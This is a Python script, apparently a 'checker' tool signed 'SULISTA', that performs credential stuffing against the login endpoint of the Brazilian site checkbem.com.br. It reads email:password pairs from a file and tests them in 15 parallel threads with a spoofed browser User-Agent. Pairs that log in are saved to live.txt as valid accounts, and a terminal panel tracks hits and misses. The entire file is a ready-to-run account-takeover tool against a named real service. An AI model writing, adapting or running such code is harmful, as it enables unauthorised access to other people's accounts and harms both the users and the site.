import curses
import requests
import os
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style
import signal

# Configurações
LOGIN_FILE = "logins.txt"
LIVE_FILE = "live.txt"
DIE_FILE = "die.txt"
ERROR_FILE = "errors.txt"
MAX_THREADS = 15
TIMEOUT = 10

# Inicialização
init(autoreset=True)
stats = {
    'total': 0,
    'live': 0,
    'die': 0,
    'error': 0,
    'start_time': time.time(),
    'running': True
}

# Handler para Ctrl+C
def signal_handler(sig, frame):
    stats['running'] = False
    print(Fore.YELLOW + "\nFinalizando... Aguarde a conclusão das threads ativas")

signal.signal(signal.SIGINT, signal_handler)

def test_login(email, password):
    url = "https://novo.checkbem.com.br/ajax-send/login-usuario.php"
    payload = {'loginSistema': email, 'senhaSistema': password}
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'https://novo.checkbem.com.br',
        'Referer': 'https://novo.checkbem.com.br/'
    }

    try:
        response = requests.post(url, data=payload, headers=headers, timeout=TIMEOUT)
        if "Login ou senha inválida!" not in response.text:
            with open(LIVE_FILE, "a") as f:
                f.write(f"{email}:{password}\n")
            return "LIVE"
        return "DIE"
    except Exception as e:
        with open(ERROR_FILE, "a") as f:
            f.write(f"{email}:{password} | {str(e)}\n")
        return "ERROR"

def update_stats(result):
    if result == "LIVE":
        stats['live'] += 1
    elif result == "DIE":
        stats['die'] += 1
    else:
        stats['error'] += 1

def painel(stdscr):
    curses.curs_set(0)
    stdscr.nodelay(1)
    curses.start_color()
    curses.init_pair(1, curses.COLOR_GREEN, curses.COLOR_BLACK)
    curses.init_pair(2, curses.COLOR_RED, curses.COLOR_BLACK)
    curses.init_pair(3, curses.COLOR_YELLOW, curses.COLOR_BLACK)
    curses.init_pair(4, curses.COLOR_CYAN, curses.COLOR_BLACK)

    while stats['running']:
        elapsed = time.time() - stats['start_time']
        stdscr.clear()
        
        # Cabeçalho
        stdscr.addstr(1, 2, "═" * 50, curses.color_pair(4))
        stdscr.addstr(2, 2, " CHECKBEM CHECKER - BY SULISTA ", curses.color_pair(4) | curses.A_BOLD)
        stdscr.addstr(3, 2, "═" * 50, curses.color_pair(4))
        
        # Estatísticas
        stdscr.addstr(5, 5, f"Total de logins: {stats['total']}", curses.color_pair(4))
        stdscr.addstr(6, 5, f"LIVE: {stats['live']}", curses.color_pair(1))
        stdscr.addstr(7, 5, f"DIE: {stats['die']}", curses.color_pair(2))
        stdscr.addstr(8, 5, f"ERROS: {stats['error']}", curses.color_pair(3))
        stdscr.addstr(9, 5, f"Tempo: {elapsed:.2f}s", curses.color_pair(4))
        
        # Progresso
        if stats['total'] > 0:
            progress = (stats['live'] + stats['die'] + stats['error']) / stats['total']
            stdscr.addstr(11, 5, "Progresso:", curses.color_pair(4))
            stdscr.addstr(11, 15, "[" + "■" * int(progress * 30) + " " * (30 - int(progress * 30)) + "]", curses.color_pair(4))
            stdscr.addstr(12, 5, f"{int(progress*100)}% completado", curses.color_pair(4))
        
        # Rodapé
        stdscr.addstr(14, 2, "═" * 50, curses.color_pair(4))
        stdscr.addstr(15, 5, "Pressione Q para sair", curses.color_pair(3))
        
        stdscr.refresh()
        
        if stdscr.getch() in [ord('q'), ord('Q')]:
            stats['running'] = False
            break
        
        time.sleep(0.1)

def main():
    if not os.path.exists(LOGIN_FILE):
        print(Fore.RED + f"Arquivo {LOGIN_FILE} não encontrado!")
        return

    with open(LOGIN_FILE, 'r') as f:
        logins = [line.strip().split(':', 1) for line in f if ':' in line.strip()]

    stats['total'] = len(logins)

    # Inicia o painel em uma thread separada
    import threading
    panel_thread = threading.Thread(target=curses.wrapper, args=(painel,))
    panel_thread.daemon = True
    panel_thread.start()

    # Processa os logins
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {executor.submit(test_login, email, password): (email, password) for email, password in logins}
        
        for future in as_completed(futures):
            if not stats['running']:
                executor.shutdown(wait=False)
                break
                
            email, password = futures[future]
            result = future.result()
            update_stats(result)

    print(Fore.GREEN + "\nVerificação concluída! Resultados salvos em:")
    print(Fore.GREEN + f"- {LIVE_FILE} (contas válidas)")
    print(Fore.RED + f"- {DIE_FILE} (contas inválidas)")
    print(Fore.YELLOW + f"- {ERROR_FILE} (erros encontrados)")

if __name__ == "__main__":
    main()